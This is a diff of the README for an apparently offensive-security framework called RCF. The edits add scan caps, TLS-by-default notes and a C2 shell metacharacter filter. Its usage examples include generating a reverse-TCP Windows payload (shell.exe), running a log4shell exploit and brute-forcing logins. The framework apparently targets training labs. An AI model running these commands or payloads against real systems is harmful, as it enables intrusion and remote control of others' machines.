@@ -37,6 +37,7 @@ rcf/
 ├── rcf-console/    # Interactive REPL with tab completion
 ├── rcf-modules/    # Module registry and plugin system
 ├── rcf-labs/       # 60+ exploit/scanner modules for HTB/THM/Metasploitable
+│   └── exploits/   # Per-exploit sub-modules (cmd_injection, sqli, etc.)
 ├── rcf-network/    # TCP scanners, protocol handlers
 ├── rcf-payload/    # Payload generator, encoders, shellcode
 ├── rcf-db/         # SQLite + Diesel with credential hashing
@@ -46,7 +47,7 @@ rcf/
 ## 🚀 Features
 
 ### Scanning & Discovery
-- **Parallel CIDR scanning** — Scan entire subnets (`192.168.1.0/24`)
+- **Parallel CIDR scanning** — Scan entire subnets (`192.168.1.0/24`); lazy expansion with `--max-targets` cap prevents OOM on large ranges
 - **Protocol fingerprinting** — HTTP, SSH, SMB, VNC, MongoDB, Memcached
 - **OS detection** — TCP stack analysis and service banner extraction
 - **Auth brute force** — SSH, FTP, HTTP, SNMP, MySQL, PostgreSQL
@@ -71,7 +72,7 @@ rcf/
 - **Secure execution** — Uses `tempfile` for unpredictable filenames
 
 ### Intelligence & Reporting
-- **SQLite database** — Hosts, services, credentials (auto-hashed), vulnerabilities
+- **SQLite database** — Hosts, services, credentials (auto-hashed), vulnerabilities; WAL mode for concurrent access
 - **Professional reports** — HTML with risk scoring, executive summary, remediation
 - **Automated attack chains** — `rcf auto -t <target> -o report.html`
 - **Export formats** — JSON, CSV, XML
@@ -134,8 +135,14 @@ cargo build --release -p rcf-cli --no-default-features
 # Scan entire /24 subnet
 rcf scan -t 192.168.1.0/24 --ports common --threads 100
 
-# Strict TLS validation (for production)
-rcf scan -t production.example.com --ports 443 --strict-tls
+# Cap targets on a large CIDR to avoid runaway scans
+rcf scan -t 10.0.0.0/8 --max-targets 500
+
+# Accept self-signed certs on a lab target (opt-in, insecure)
+rcf scan -t 192.168.1.100 --ports 443 --dangerous-accept-invalid-certs
+
+# Run auto attack chain with bounded module concurrency
+rcf auto -t 10.10.10.10 -o report.html --max-modules 3
 
 # Generate and save payload
 rcf venom -p reverse_tcp --lhost 10.0.0.1 --lport 4444 -f pe -o shell.exe
@@ -149,13 +156,13 @@ rcf run -m exploit/multi/http/log4shell -t 192.168.1.100 -p 8080
 This project has undergone a comprehensive security audit. See [`SECURITY.md`](SECURITY.md) for vulnerability reporting and [`SECURITY_AUDIT.md`](SECURITY_AUDIT.md) for findings.
 
 **Key security features:**
-- Meterpreter command sandboxing (blocks dangerous patterns)
+- **TLS validation on by default** — all HTTP clients validate certificates; use `--dangerous-accept-invalid-certs` only for lab targets with self-signed certs
+- **C2 shell metacharacter filter** — `exec` command blocks `;`, `&&`, `||`, `|`, `` ` ``, `$()`, `<`, `>` before the allowlist check, preventing injection chains
+- Meterpreter command allowlist — only explicitly permitted commands execute
 - Automatic credential hashing (Argon2id + random salt); plaintext zeroed from memory via `zeroize` immediately after hashing
 - HTML escaping in all report generation
 - Path validation for file operations
 - Secure temp files via `tempfile` crate
-- `--strict-tls` flag for TLS validation
-- C2 agent command allowlist — only explicitly permitted commands execute
 
 > ⚠️ **Never run RCF as root** unless required (e.g., SYN scanning). Use a sandboxed environment.
 
